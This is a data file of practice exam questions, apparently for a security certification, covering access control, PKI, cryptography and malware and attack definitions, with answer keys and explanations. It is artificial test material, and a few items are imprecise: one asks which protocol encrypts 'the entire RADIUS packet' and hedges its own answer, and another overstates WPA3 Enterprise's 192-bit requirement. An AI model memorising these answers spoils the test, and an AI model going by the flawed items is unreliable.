  {id:53,domain:G,question:"Which protocol provides centralized authentication, authorization, and accounting for network device administration?",options:["RADIUS","TACACS+","Kerberos","SAML"],answer:1,explanation:"TACACS+ separates authentication, authorization, and accounting and is commonly used for managing network devices.",optionExplanations:["RADIUS combines authentication and authorization in one step and is primarily used for network access, not device administration.","TACACS+ keeps AAA functions separate and encrypts the entire payload, making it preferred for device administration.","Kerberos uses tickets for domain authentication; it is not typically used for network device management.","SAML is an SSO/federation protocol for web applications, not network device administration."]},
  {id:54,domain:G,question:"What is the main difference between identification and authentication?",options:["Identification verifies; authentication claims","Identification claims identity; authentication verifies it","They are the same process","Authentication happens before identification"],answer:1,explanation:"Identification = claiming who you are (username); Authentication = proving it (password, biometric).",optionExplanations:["Identification claims identity; authentication verifies the claim — not the other way around.","Identification is claiming an identity (entering a username); authentication proves that claim (entering a password).","They are distinct steps: first you identify yourself, then prove it.","Authentication always follows identification; you must first claim an identity before proving it."]},
  {id:55,domain:G,question:"Which of the following is an example of a technical security control?",options:["Acceptable use policy","Security awareness training","Data encryption","Background checks"],answer:2,explanation:"Technical controls are implemented through technology: firewalls, encryption, IDS, access controls.",optionExplanations:["An acceptable use policy is an administrative control.","Security awareness training is an administrative/preventive control.","Data encryption is a technical control that protects data confidentiality using cryptography.","Background checks are administrative (personnel) controls."]},
  {id:56,domain:G,question:"Which of the following is TRUE about WPA3 Enterprise?",options:["It uses a pre-shared key for authentication","It requires 192-bit encryption","It is backward compatible with WEP","It uses TKIP for encryption"],answer:1,explanation:"WPA3 Enterprise mandates a 192-bit security suite for the highest protection level.",optionExplanations:["Pre-shared keys are used in WPA3 Personal (SAE), not WPA3 Enterprise.","WPA3 Enterprise requires a 192-bit minimum security suite (CNSA suite) for government/sensitive environments.","WEP is a decades-old broken protocol; WPA3 has no compatibility with it.","WPA3 uses GCMP-256 for encryption, replacing WPA2's CCMP/AES and the deprecated TKIP."]},
  {id:57,domain:G,question:"What does the term 'defense in depth' mean?",options:["Deploying one highly sophisticated security control and relying entirely on its strength to stop all attacks","Layering multiple security controls so failure of one does not compromise the system","Encrypting all data as it traverses each individual network segment between source and destination","Mandating thorough background investigation screening for every new employee before granting system access"],answer:1,explanation:"Defense in depth uses multiple overlapping security layers so an attacker must defeat several controls.",optionExplanations:["Relying on a single highly sophisticated control is the opposite of defense in depth and creates a single point of failure.","Defense in depth layers multiple controls (technical, administrative, physical) so no single control failure is catastrophic.","Encrypting data at each network segment hop is a data-in-transit strategy; defense in depth encompasses all control types and domains.","Background investigations are one administrative layer; defense in depth is the broader philosophy of layering many diverse controls."]},
  {id:58,domain:G,question:"Which port does HTTPS use by default?",options:["80","443","8080","22"],answer:1,explanation:"HTTPS (HTTP over TLS) runs on TCP port 443 by default.",optionExplanations:["Port 80 is the default for unencrypted HTTP traffic.","Port 443 is the well-known port for HTTPS — HTTP secured with TLS.","Port 8080 is a common alternative HTTP port used for development/proxy purposes.","Port 22 is reserved for SSH, not HTTPS."]},
  {id:59,domain:G,question:"Which of the following BEST describes role-based access control?",options:["Access is determined by the system based on data labels","Users are granted access based on their job function and role","The resource owner determines who can access their data","Access is granted based on a combination of user, resource, and environmental attributes"],answer:1,explanation:"In RBAC, permissions are assigned to roles (e.g., HR, Finance) and users inherit permissions by being assigned a role.",optionExplanations:["Access determined by data labels describes Mandatory Access Control (MAC).","RBAC maps permissions to job roles, reducing administrative overhead and improving consistency.","Owner-controlled access describes Discretionary Access Control (DAC).","Multi-attribute decisions describe Attribute-Based Access Control (ABAC)."]},
  {id:60,domain:G,question:"Which of the following is a detective security control?",options:["A software solution that monitors data transfers and blocks unauthorized movement of sensitive files in real time","Security camera footage reviewed after an incident","Applying cryptographic algorithms to sensitive data so that unauthorized access yields unreadable ciphertext","Installing high-security physical locks on server room doors to prevent unauthorized personnel from gaining entry"],answer:1,explanation:"Detective controls identify incidents after they occur; reviewing camera footage to detect a breach is detective.",optionExplanations:["A solution that monitors and blocks unauthorized data movement in real time describes DLP — primarily a preventive control.","Reviewing security camera footage after an incident detects that an event occurred — a detective control.","Applying cryptography to sensitive data to make it unreadable to unauthorized parties is a preventive control.","Installing physical locks on server room doors to block unauthorized personnel entry is a preventive physical control."]},
  {id:61,domain:G,question:"What is the purpose of a nonce in cryptography?",options:["Serve as a long-term storage container for symmetric encryption keys within a key management system","Ensure a value is used only once to prevent replay attacks","Act as a direct substitute for the initialization vector in CBC and CTR mode encryption operations","Derive the public component of an asymmetric key pair through mathematical operations on curve parameters"],answer:1,explanation:"A nonce (number used once) prevents replay attacks by ensuring each request or session is unique.",optionExplanations:["A long-term container for symmetric encryption keys describes a key management system or HSM, not a nonce.","A nonce is used exactly once to guarantee freshness and prevent attackers from replaying captured messages.","An IV randomizes encryption; while nonces and IVs serve similar anti-replay roles, a nonce specifically ensures uniqueness in protocols.","Public keys are derived from mathematical operations on private key parameters; they are not generated from nonces."]},
  {id:62,domain:G,question:"What distinguishes TOTP from HOTP?",options:["TOTP synchronizes on an incrementing event counter while HOTP uses the current Unix timestamp divided into 30-second windows","TOTP is based on time intervals; HOTP is based on a counter","TOTP exclusively requires a dedicated hardware token while HOTP can only be implemented as a software application","TOTP and HOTP are functionally equivalent algorithms that produce identical codes under all conditions"],answer:1,explanation:"TOTP (Time-based OTP) rotates every 30 seconds. HOTP (HMAC-based OTP) increments a counter with each use.",optionExplanations:["HOTP uses an event counter that increments with each authentication attempt; TOTP uses time — the descriptions are reversed here.","TOTP generates a new code every 30 seconds based on the current time; HOTP increments a shared counter with each use.","Both TOTP and HOTP can be implemented in hardware tokens or software applications such as authenticator apps.","TOTP and HOTP differ fundamentally in their synchronization mechanism — time versus event counter — producing different codes."]},
  {id:63,domain:G,question:"A company implements biometric authentication. Which of the following is a major concern?",options:["Biometrics are incompatible with multi-factor authentication frameworks and cannot be combined with passwords or tokens","Biometric data cannot be changed if compromised","Modern enterprise biometric readers are prohibitively slow, causing unacceptable delays in high-volume authentication workflows","Biometric authentication systems require constant cloud connectivity to validate templates and cannot function offline"],answer:1,explanation:"Unlike passwords, biometric traits (fingerprints, retinas) cannot be reissued if the stored template is breached.",optionExplanations:["Biometrics are commonly and effectively used as an inherence factor in MFA alongside passwords or hardware tokens.","If biometric templates are stolen, the underlying trait cannot be changed, creating a permanent and irremediable vulnerability.","Modern biometric readers (fingerprint, facial recognition) are fast and widely deployed in enterprise environments without causing meaningful delays.","Biometric matching frequently occurs locally on-device using stored templates, functioning fully without any internet connectivity."]},
  {id:64,domain:G,question:"What does the term 'open authentication' (OAuth) primarily provide?",options:["Applying end-to-end encryption to password fields so credentials cannot be intercepted during transmission","Authorization delegation allowing a user to grant third-party access without sharing credentials","Managing the full lifecycle of X.509 certificates including issuance, renewal, and revocation","Requiring users to supply a second authentication factor such as a TOTP code before completing login"],answer:1,explanation:"OAuth allows a user to authorize a third-party app to access their resources without exposing their credentials.",optionExplanations:["Applying encryption to password fields describes TLS transport security; OAuth eliminates the need to transmit passwords to third parties.","OAuth issues scoped access tokens that grant limited access to user resources on behalf of the user, without sharing credentials.","Managing the lifecycle of X.509 certificates describes a Public Key Infrastructure (PKI), not OAuth.","Requiring a second authentication factor like a TOTP code describes multi-factor authentication, a separate mechanism from OAuth."]},
  {id:65,domain:G,question:"Which cipher mode provides both encryption and authentication?",options:["ECB","CBC","CTR","GCM"],answer:3,explanation:"GCM (Galois/Counter Mode) provides confidentiality (counter mode) and message authenticity (GHASH).",optionExplanations:["ECB encrypts blocks independently with no authentication and reveals patterns — the weakest mode.","CBC provides encryption but requires a separate MAC for authentication.","CTR mode provides encryption but not built-in authentication.","GCM combines CTR encryption with a GHASH authentication tag, providing both confidentiality and integrity."]},
  {id:66,domain:G,question:"What is a PKI trust anchor?",options:["A leaf certificate issued directly to an end entity such as a web server, email user, or code-signing account","The root CA whose certificate is inherently trusted","A subordinate CA certificate that chains to the root and is used to issue end-entity certificates","A tamper-resistant hardware device that securely stores and performs cryptographic operations with private keys"],answer:1,explanation:"The root CA is the trust anchor; its self-signed certificate is explicitly trusted in certificate stores.",optionExplanations:["Leaf certificates issued to end entities like web servers chain upward through intermediates to the root; they are not the trust anchor.","The root CA is the ultimate trust anchor; its self-signed certificate is pre-installed in browsers and operating systems.","A subordinate (intermediate) CA certificate is signed by the root and inherits trust through the chain, but it is not itself the anchor.","A tamper-resistant hardware device storing private keys describes an HSM; it is not a trust anchor in the PKI chain of trust."]},
  {id:67,domain:G,question:"Which of the following is a characteristic of attribute-based access control (ABAC)?",options:["Access is granted based on predefined roles","Access is based on data classification labels","Access decisions evaluate user, resource, and environmental attributes simultaneously","The data owner controls access"],answer:2,explanation:"ABAC evaluates multiple attributes dynamically — user department, resource sensitivity, time of day, location, etc.",optionExplanations:["Predefined roles describe RBAC (Role-Based Access Control).","Classification labels describe MAC (Mandatory Access Control).","ABAC is highly flexible, evaluating combinations of attributes about the user, resource, and environment.","Owner-controlled access describes DAC (Discretionary Access Control)."]},
  {id:68,domain:G,question:"Which of the following protocols encrypts the ENTIRE RADIUS packet, including the username?",options:["RADIUS over UDP","RADIUS over TCP","TACACS+","LDAP over TLS"],answer:2,explanation:"TACACS+ encrypts the entire packet body. RADIUS only encrypts the password field.",optionExplanations:["Standard RADIUS over UDP encrypts only the password field, leaving the username in plaintext.","RADIUS over TCP (RADIUS/TLS or RadSec) encrypts everything, but standard TACACS+ is the more common answer here.","TACACS+ encrypts the entire packet payload, providing better protection than standard RADIUS.","LDAP over TLS encrypts the LDAP session but is a directory protocol, not an AAA protocol."]},
  {id:69,domain:G,question:"What is the purpose of a cross-certification between two PKIs?",options:["Automatically revoke certificates issued by either CA when a breach is detected, propagating the revocation across both hierarchies","Allow users of one PKI to trust users of another PKI","Permanently merge two separate CA hierarchies by consolidating their root certificates into a single unified root CA","Improve the speed of certificate status lookups by distributing OCSP responders across both PKI environments"],answer:1,explanation:"Cross-certification creates mutual trust between separate PKI hierarchies so entities in each can validate the other's certificates.",optionExplanations:["Revocation propagation across PKIs is handled through CRLs and OCSP within each PKI independently, not by cross-certification.","Cross-certification establishes a bilateral trust relationship between two separate PKI environments so each trusts the other's certificates.","Merging two CA hierarchies into a single root would require re-issuing all certificates; cross-certification creates trust without merging.","Certificate validation speed depends on OCSP/CRL infrastructure within each PKI; cross-certification is about trust establishment."]},
  {id:70,domain:G,question:"Which of the following describes a 'chain of trust' in PKI?",options:["A series of encrypted tunnels between servers","The hierarchy from root CA through intermediate CAs to end-entity certificates","A linked list of revoked certificates","A protocol for verifying IP addresses"],answer:1,explanation:"The chain of trust links an end-entity certificate back to a trusted root CA via intermediate CAs.",optionExplanations:["Encrypted tunnels describe VPNs or TLS sessions, not PKI chain of trust.","The certificate chain of trust goes from the end-entity certificate through intermediates to the root CA.","A linked list of revoked certificates describes a CRL, not a chain of trust.","IP address verification is done through protocols like DNSSEC or BGP security, not PKI chains."]},
  {id:71,domain:G,question:"Which of the following is a feature of SSO (Single Sign-On)?",options:["Users must log in separately to each system","One set of credentials grants access to multiple systems","Each system maintains its own password database","SSO eliminates the need for encryption"],answer:1,explanation:"SSO lets users authenticate once and gain access to all connected systems without re-authenticating.",optionExplanations:["Logging in separately to each system is the problem SSO solves.","SSO authenticates the user once, then passes tokens or assertions to other systems, eliminating repeated logins.","With SSO, a central identity provider manages authentication; individual systems rely on it.","SSO addresses authentication, not encryption; both can coexist independently."]},
  {id:72,domain:G,question:"What is the purpose of a security token in authentication?",options:["Apply full-disk encryption to protect sensitive files stored on a laptop or portable storage device from physical theft","Generate or store one-time passwords or cryptographic keys for authentication","Act as a complete replacement for fingerprint and retina biometric authentication factors in all enterprise scenarios","Inspect network packets for malicious signatures and block or alert on detected intrusion attempts"],answer:1,explanation:"Security tokens (hardware or software) generate OTPs or store private keys to prove identity.",optionExplanations:["Applying full-disk encryption to protect stored data describes a storage encryption tool, not a security token.","Security tokens produce time-based or counter-based OTPs, or store cryptographic material for strong authentication.","Security tokens supplement or replace passwords but do not necessarily replace all biometric factors in every scenario.","Inspecting network packets for malicious signatures and alerting on intrusions describes IDS/IPS and SIEM tools."]},
  {id:73,domain:G,question:"Which of the following BEST describes the concept of 'need to know'?",options:["Users should have the minimum permissions for their job","Users should only access information required for their specific task","All users in a role share the same access level","Administrators can override all access restrictions"],answer:1,explanation:"Need to know means even if you have clearance, you should only access information you specifically require for a task.",optionExplanations:["Minimum permissions for a job describes least privilege, a related but distinct concept.","Need to know restricts information access to what is necessary for a particular task, even within authorized clearance.","Shared role-based access describes RBAC; need to know applies further granular restrictions within roles.","Unrestricted admin override would violate both least privilege and need to know principles."]},
  {id:74,domain:G,question:"A company wants to ensure no single administrator can access a key alone. Which concept applies?",options:["Dual control","Separation of duties","Least privilege","Key escrow"],answer:0,explanation:"Dual control requires two authorized individuals to be present for a sensitive operation, like accessing a cryptographic key.",optionExplanations:["Dual control specifically requires two people simultaneously to perform a sensitive operation.","Separation of duties splits different parts of a task among people, but dual control specifically requires simultaneous presence.","Least privilege limits permissions but does not require two-person presence for access.","Key escrow holds keys with a trusted third party for recovery, not specifically about requiring two people."]},
  {id:75,domain:G,question:"Which of the following is NOT a goal of information security?",options:["Confidentiality","Integrity","Availability","Profitability"],answer:3,explanation:"The CIA triad covers Confidentiality, Integrity, and Availability. Profitability is a business goal, not an information security goal.",optionExplanations:["Confidentiality is the C in the CIA triad, a core information security goal.","Integrity is the I in the CIA triad, ensuring data accuracy and trustworthiness.","Availability is the A in the CIA triad, ensuring systems are accessible when needed.","Profitability is a business objective, not an information security goal."]},
  {id:76,domain:T,question:"Which type of malware disguises itself as legitimate software?",options:["Worm","Virus","Trojan","Ransomware"],answer:2,explanation:"A Trojan masquerades as legitimate software to trick users into installing it.",optionExplanations:["A worm self-replicates across networks without needing to be attached to a host program.","A virus attaches to a host file and replicates when the file is executed.","A Trojan appears to be useful software but carries malicious payload; it does not self-replicate.","Ransomware encrypts data and demands payment; while a Trojan can deliver ransomware, ransomware itself is a category."]},
  {id:77,domain:T,question:"What is a rootkit?",options:["Malware that encrypts victim files and demands cryptocurrency payment in exchange for the decryption key","Software that hides its presence and provides privileged access to an attacker","Self-replicating malware that propagates automatically through email attachments and shared network drives","A port-scanning utility that maps open services on target systems to identify attack vectors"],answer:1,explanation:"Rootkits hide malicious code and provide persistent privileged access while evading detection.",optionExplanations:["File-encrypting malware demanding payment describes ransomware, which operates very differently from a rootkit's stealth and persistence goals.","A rootkit embeds itself at the OS or kernel level to conceal itself and give attackers persistent privileged access.","Self-replicating malware spreading via email describes a worm; worms do not primarily focus on hiding themselves from detection.","Port-scanning utilities are reconnaissance tools used before an attack; rootkits are post-compromise persistence and stealth mechanisms."]},
  {id:78,domain:T,question:"Which attack targets the DNS system to redirect users to malicious websites?",options:["Phishing","DNS poisoning","ARP spoofing","Session hijacking"],answer:1,explanation:"DNS poisoning (cache poisoning) injects malicious records into a DNS cache, redirecting users to attacker-controlled sites.",optionExplanations:["Phishing sends deceptive messages to trick users into revealing credentials; it does not modify DNS.","DNS poisoning corrupts DNS cache entries so hostnames resolve to attacker IP addresses.","ARP spoofing maps an attacker's MAC to a legitimate IP address on a local network, a LAN-layer attack.","Session hijacking steals an authenticated session token to impersonate a logged-in user."]},
  {id:79,domain:T,question:"A user receives an email appearing to be from their bank asking them to click a link and verify their account. This is MOST likely:",options:["Vishing","Smishing","Phishing","Whaling"],answer:2,explanation:"A deceptive email impersonating a trusted entity to steal credentials is a phishing attack.",optionExplanations:["Vishing uses phone calls (voice phishing) to trick victims, not emails.","Smishing uses SMS text messages to deliver the deceptive message.","Phishing uses deceptive emails impersonating trusted entities to steal credentials or install malware.","Whaling targets high-profile executives specifically; this example is generic, so phishing is more accurate."]},
  {id:80,domain:T,question:"What is ransomware?",options:["Malware that embeds itself at the kernel or OS level to conceal attacker activity and maintain persistent privileged access","Malware that encrypts files and demands payment for decryption","Software that silently captures every keystroke to harvest credentials and other sensitive user input","Self-replicating malware that spreads automatically between systems via removable media or network file shares"],answer:1,explanation:"Ransomware encrypts victim data and demands a ransom (often cryptocurrency) in exchange for the decryption key.",optionExplanations:["Malware embedding itself at the kernel level to hide attacker access describes a rootkit, not ransomware.","Ransomware encrypts files or entire systems and extorts the victim for the decryption key.","Software that silently captures keystrokes describes a keylogger or spyware, focused on credential theft rather than extortion.","Self-replicating malware spreading via removable media describes a worm; ransomware focuses on encryption and extortion."]},
  {id:81,domain:T,question:"Which social engineering technique involves an attacker pretending to be an IT support technician to gain access?",options:["Phishing","Pretexting","Tailgating","Baiting"],answer:1,explanation:"Pretexting creates a fabricated scenario (a pretext) to manipulate a target into revealing information or granting access.",optionExplanations:["Phishing is conducted via deceptive emails, not by impersonating a person in direct interaction.","Pretexting involves creating a false identity or scenario to manipulate someone into granting access.","Tailgating is physically following an authorized person through a secure entry point.","Baiting uses physical media (USB drives) or enticing offers to lure victims into taking dangerous actions."]},
  {id:82,domain:T,question:"What is a SQL injection attack?",options:["Appending malicious bytecode to legitimate executable files so they execute attacker-controlled code when opened","Injecting malicious SQL code into an input field to manipulate a database","Overwhelming a database server with high volumes of connection requests until it exhausts available resources","Intercepting and reading database query packets on the wire using a network protocol analyzer"],answer:1,explanation:"SQL injection inserts malicious SQL statements into unvalidated input fields to manipulate or extract database data.",optionExplanations:["Appending malicious code to executables describes a file-infecting virus, a different class of malware from SQL injection.","SQL injection exploits insufficient input validation to execute arbitrary SQL commands against the database.","Overwhelming a server with connection requests describes a denial-of-service attack targeting availability, not database manipulation.","Intercepting database packets on the network describes a man-in-the-middle attack, not a SQL injection technique."]},
  {id:83,domain:T,question:"Which of the following is a characteristic of an Advanced Persistent Threat (APT)?",options:["An opportunistic, single-attempt attack using publicly available exploit tools and no specific target selection criteria","It is a long-term, stealthy intrusion typically by a nation-state actor","A campaign that focuses exclusively on compromising consumer mobile devices and personal social media accounts","An attack that relies entirely on phishing emails without employing any other technical exploitation techniques"],answer:1,explanation:"APTs are prolonged, targeted attacks, often state-sponsored, focused on espionage or sabotage with minimal noise.",optionExplanations:["APTs are persistent and highly targeted; opportunistic single-attempt attacks using public tools describe commodity threat actors, not APTs.","APTs involve prolonged, stealthy access typically attributed to nation-states or well-funded groups with specific strategic objectives.","APTs target governments, critical infrastructure, defense contractors, and large enterprises, not primarily consumer devices or social media.","APTs use a wide range of techniques including zero-days, spear phishing, supply chain compromise, lateral movement, and custom malware."]},
  {id:84,domain:T,question:"What is the purpose of a botnet?",options:["Provide encrypted tunnels that allow legitimate corporate employees to securely access internal resources from remote locations","Coordinate large-scale attacks using infected systems controlled by an attacker","Archive exfiltrated data records in cloud storage buckets that the attacker maintains under false identities","Apply TLS encryption to all outbound command-and-control traffic so network defenders cannot inspect its contents"],answer:1,explanation:"A botnet is a network of compromised computers (bots) controlled by a command-and-control server for attacks.",optionExplanations:["Providing encrypted tunnels for employees to access internal resources remotely describes a VPN, not a botnet.","A botnet gives attackers a distributed platform of infected machines to launch DDoS attacks, spam campaigns, credential stuffing, and more.","While stolen data may be exfiltrated to cloud storage, a botnet is primarily an attack launch platform, not a data archiving service.","Botnets use C2 communications which may or may not be encrypted; applying TLS to all C2 traffic is one evasion technique, not the botnet's purpose."]},
  {id:85,domain:T,question:"Which attack type exploits unvalidated user input to execute scripts in a victim's browser?",options:["SQL injection","Cross-site scripting (XSS)","CSRF","Buffer overflow"],answer:1,explanation:"XSS injects malicious scripts into web pages viewed by other users, executing in their browser context.",optionExplanations:["SQL injection targets database queries via input fields, not browser script execution.","XSS injects malicious JavaScript into a trusted web page, which then executes in victims' browsers.","CSRF tricks a browser into making unauthorized requests on behalf of a logged-in user, not script injection.","Buffer overflow corrupts memory to execute code on the server or client, not via browser script injection."]},
  {id:86,domain:T,question:"What does a keylogger do?",options:["Applies end-to-end encryption to keyboard input before it reaches the operating system, protecting data from interception","Records keystrokes to capture credentials and sensitive data","Enforces access control policies that restrict which users or processes are permitted to receive keyboard input events","Maintains a version history of keyboard device firmware changes and driver installations for audit purposes"],answer:1,explanation:"A keylogger captures every keystroke made by the user, allowing attackers to steal passwords and sensitive information.",optionExplanations:["Encrypting keyboard input before it reaches the OS would defeat a keylogger's purpose; real keyloggers capture plaintext keystrokes.","Keyloggers silently capture and exfiltrate keystrokes, often used to steal credentials and financial information.","Enforcing access control over keyboard input describes input validation or HID security policies, not keylogger behavior.","Logging firmware version history is a patch management and asset tracking activity, not what a keylogger does."]},
  {id:87,domain:T,question:"What is a watering hole attack?",options:["Exploiting vulnerabilities in industrial control systems managing a utility's water treatment or distribution infrastructure","Compromising a website frequently visited by the intended targets","Sending personalized deceptive emails crafted with target-specific information to trick employees into clicking malicious links","Covertly loading malicious code onto removable USB drives and leaving them in high-traffic areas to tempt employees"],answer:1,explanation:"A watering hole attack compromises a website the target group regularly visits, infecting them when they browse it.",optionExplanations:["Exploiting ICS systems in water treatment infrastructure is critical infrastructure sabotage, not a watering hole cyberattack.","Watering hole attacks compromise legitimate websites visited by targets, injecting malware to infect visitors silently.","Sending personalized deceptive emails with target-specific information describes spear phishing, not a watering hole attack.","Loading malware onto USB drives and leaving them in public areas describes a baiting attack, not a watering hole."]},
  {id:88,domain:T,question:"What is the primary goal of a DDoS (Distributed Denial of Service) attack?",options:["Exfiltrate sensitive records from a target database by exploiting unvalidated input fields in web-facing applications","Make a service unavailable by overwhelming it with traffic","Establish a persistent covert foothold in a target network for long-term espionage or data collection","Encrypt victim files using asymmetric cryptography and demand cryptocurrency payment for the decryption key"],answer:1,explanation:"DDoS attacks flood a target with traffic from many sources to exhaust resources and deny service to legitimate users.",optionExplanations:["Exfiltrating records through database exploits is a data theft attack focused on confidentiality, not disrupting availability.","DDoS attacks overwhelm a target with traffic from botnets, making the service unavailable to legitimate users.","Establishing a persistent covert foothold describes an Advanced Persistent Threat; the goal is espionage, not denial of service.","Encrypting files for cryptocurrency ransom describes ransomware, which targets data integrity and extorts victims."]},
  {id:89,domain:T,question:"Which of the following BEST describes spear phishing?",options:["Bulk deceptive emails sent simultaneously to millions of recipients using generic templates that impersonate banks or delivery services","Highly targeted phishing attacks tailored to a specific individual or organization","Deceptive social engineering calls in which an attacker impersonates IT support or a financial institution over the phone","Fraudulent text messages containing malicious links or urgent prompts sent directly to a victim's mobile device"],answer:1,explanation:"Spear phishing uses personalized information about the target to make the deceptive message more convincing.",optionExplanations:["Bulk deceptive emails sent to millions using generic templates describe standard (mass) phishing, not the personalized targeting of spear phishing.","Spear phishing tailors the attack using the target's name, role, or relationships to increase believability.","Deceptive phone calls impersonating IT support or financial institutions describe vishing (voice phishing).","Fraudulent text messages with malicious links describe smishing (SMS phishing)."]},
  {id:90,domain:T,question:"What is a zero-day exploit?",options:["An exploit that is deployed on the same calendar day a software product is publicly released to market","An exploit targeting an unknown vulnerability for which no patch exists","An exploit whose source code is publicly released on the day the vulnerability is disclosed to the vendor","A high-volume traffic flood attack that overwhelms server resources and denies service to legitimate users"],answer:1,explanation:"A zero-day exploit attacks a vulnerability unknown to the vendor — there are zero days of warning or patching time.",optionExplanations:["Timing relative to a software release date does not define a zero-day; the defining factor is that the vulnerability is unknown to the vendor.","A zero-day exploit targets a vulnerability the vendor is unaware of, meaning no patch exists at time of attack.","Public release of exploit code on disclosure day describes a published proof-of-concept, not the definition of a zero-day (which is pre-disclosure).","A high-volume traffic flood describes a denial-of-service attack; zero-days are code exploits targeting software vulnerabilities."]},
  {id:91,domain:T,question:"Which of the following BEST describes a man-in-the-browser attack?",options:["An attacker physically sits between two users","Malware intercepts and modifies browser transactions in real time","An attacker monitors browser history","A phishing page that mimics a bank website"],answer:1,explanation:"Man-in-the-browser malware modifies web transactions inside the browser after authentication, often targeting banking.",optionExplanations:["Physical positioning describes a traditional MITM; man-in-the-browser is a malware-based attack.","MITB malware hooks browser functions to alter transactions transparently to the user, bypassing TLS.","Monitoring browser history is spyware behavior, not specifically man-in-the-browser.","A fake phishing page is credential harvesting; MITB operates within a legitimate session already authenticated."]},
  {id:92,domain:T,question:"What is credential stuffing?",options:["Deliberately creating predictable or simplistic passwords that fail to meet minimum entropy requirements for complexity","Using large sets of stolen username/password pairs to attempt logins on multiple sites","Embedding malicious SQL syntax into web form credential fields to bypass authentication mechanisms","Systematically attempting every possible character combination against a single target account until access is granted"],answer:1,explanation:"Credential stuffing reuses breached credential lists against many sites, exploiting password reuse.",optionExplanations:["Deliberately creating weak passwords is poor password hygiene; credential stuffing attacks valid but reused credentials from breached databases.","Credential stuffing automates login attempts using leaked credential databases, exploiting password reuse across sites.","Embedding SQL syntax into credential fields to bypass authentication describes SQL injection, not credential stuffing.","Systematically trying every character combination against one account describes a brute force attack, not credential stuffing."]},
  {id:93,domain:T,question:"Which type of threat actor is MOST motivated by financial gain?",options:["Hacktivist","Nation-state actor","Cybercriminal","Script kiddie"],answer:2,explanation:"Cybercriminals are primarily motivated by financial gain through ransomware, fraud, or data theft.",optionExplanations:["Hacktivists are motivated by ideology or political/social causes, not primarily financial gain.","Nation-state actors are motivated by espionage, disruption, or geopolitical objectives.","Cybercriminals seek financial profit through ransomware, banking trojans, and selling stolen data.","Script kiddies use pre-made tools for notoriety or thrill, rarely with a clear financial agenda."]},
  {id:94,domain:T,question:"What is a buffer overflow attack?",options:["Sending large volumes of UDP datagrams to a target server to exhaust its network bandwidth and processing capacity","Writing more data to a buffer than it can hold to overwrite adjacent memory","Positioning an attacker between a client and server to intercept and modify data flowing between them","Embedding malicious JavaScript into a trusted web page so it executes in other users' browsers"],answer:1,explanation:"Buffer overflows occur when a program writes beyond allocated memory, potentially allowing code execution.",optionExplanations:["Sending high-volume UDP packets to exhaust bandwidth describes a UDP flood denial-of-service attack, not a memory exploit.","A buffer overflow writes data beyond the end of a fixed-size buffer, corrupting adjacent memory and potentially executing attacker code.","Positioning between a client and server to intercept traffic describes a man-in-the-middle attack.","Embedding malicious JavaScript that executes in other users' browsers describes cross-site scripting (XSS)."]},
  {id:95,domain:T,question:"Which of the following is an indicator of a phishing email? (Choose the BEST answer)",options:["The email comes from a known colleague","The email contains urgent language and requests credentials via a link","The email has a company signature","The email is encrypted with S/MIME"],answer:1,explanation:"Urgency and requests to click links and provide credentials are classic phishing red flags.",optionExplanations:["Emails from known colleagues can be legitimate, though spear phishing can spoof them.","Urgency, requests for credentials, and embedded links are the most reliable phishing indicators.","Company email signatures can be easily spoofed; their presence does not confirm legitimacy.","S/MIME encrypted emails are unusual for phishing but not impossible; legitimate emails are also often signed."]},
  {id:96,domain:T,question:"What is a logic bomb?",options:["Self-replicating malware that propagates rapidly across a network by exploiting open shares and unpatched vulnerabilities","Malicious code that executes when a specific condition or trigger is met","Software that floods a target with excessive traffic to exhaust available network bandwidth and processing resources","Covert malware that continuously records screen contents and user activity and transmits them to a remote attacker"],answer:1,explanation:"A logic bomb lies dormant until a specific trigger (date, event, action) activates the malicious payload.",optionExplanations:["Self-replicating malware spreading through network shares and vulnerabilities describes a worm, not a logic bomb.","A logic bomb remains dormant until a defined trigger (e.g., a date or the absence of an employee's login) fires the payload.","Software flooding a target to exhaust resources describes a denial-of-service tool; logic bombs execute local payloads.","Covert malware recording screen activity and transmitting it describes spyware or a RAT, not a logic bomb."]},
  {id:97,domain:T,question:"What type of malware conceals itself and steals data over an extended period without detection?",options:["Ransomware","Worm","Spyware","Virus"],answer:2,explanation:"Spyware covertly monitors user activity and exfiltrates data without the user's knowledge.",optionExplanations:["Ransomware makes itself known by displaying a ransom demand after encryption.","Worms self-replicate and spread; their main goal is propagation rather than stealth data collection.","Spyware silently monitors and transmits user activity, browsing, and credentials to attackers.","Viruses attach to files and replicate when files execute; they are not primarily designed for stealth data collection."]},
  {id:98,domain:T,question:"Which of the following describes a vishing attack?",options:["A phishing attack delivered via email","A phishing attack conducted over the phone","A phishing attack using SMS messages","A phishing attack through social media"],answer:1,explanation:"Vishing (voice phishing) uses telephone calls to manipulate victims into revealing sensitive information.",optionExplanations:["Email phishing is simply called phishing.","Vishing uses phone calls (voice) to impersonate banks, IT support, or government agencies to steal information.","SMS-based phishing is smishing (SMS phishing).","Social media phishing can be considered spear phishing or social engineering but is not vishing."]},
  {id:99,domain:T,question:"What is the purpose of a threat intelligence feed?",options:["Scan endpoints in real time for known malware signatures and quarantine malicious files before they can execute","Provide real-time or near-real-time information about known threats, indicators, and TTPs","Apply cryptographic algorithms to protect sensitive data from unauthorized disclosure during storage and transmission","Provision user accounts with appropriate access rights and manage entitlements throughout the identity lifecycle"],answer:1,explanation:"Threat intelligence feeds provide up-to-date data on threats, attacker TTPs, malware hashes, malicious IPs, and IOCs.",optionExplanations:["Scanning endpoints for malware signatures and quarantining threats is the function of EDR and antivirus software.","Threat intelligence feeds supply actionable information (IOCs, TTPs, threat actor profiles) to improve detection and response.","Applying cryptographic algorithms to protect sensitive data describes encryption tools and protocols.","Provisioning and managing user account entitlements describes identity and access management (IAM) solutions."]},
  {id:100,domain:T,question:"Which of the following BEST describes a supply chain attack?",options:["Gaining unauthorized physical entry to a vendor's warehouse or shipping facility to tamper with hardware during transit","Compromising a vendor or software provider to inject malware into their product before delivery","Sending targeted phishing emails to employees of a supplier organization to harvest their login credentials","Exfiltrating sensitive records from a cloud provider's databases by exploiting misconfigured storage permissions"],answer:1,explanation:"Supply chain attacks compromise trusted third-party software or hardware before it reaches the target organization.",optionExplanations:["Unauthorized physical access to a warehouse to tamper with hardware is sabotage; supply chain attacks typically involve software compromise at the vendor level.","Supply chain attacks compromise upstream vendors, inserting malicious code into updates or hardware before delivery.","Phishing supplier employees to harvest credentials may be a preliminary step, but it is not the defining characteristic of a supply chain attack.","Exfiltrating data from a cloud provider through misconfigured storage is a cloud breach, not a supply chain attack exploiting the trusted vendor relationship."]},
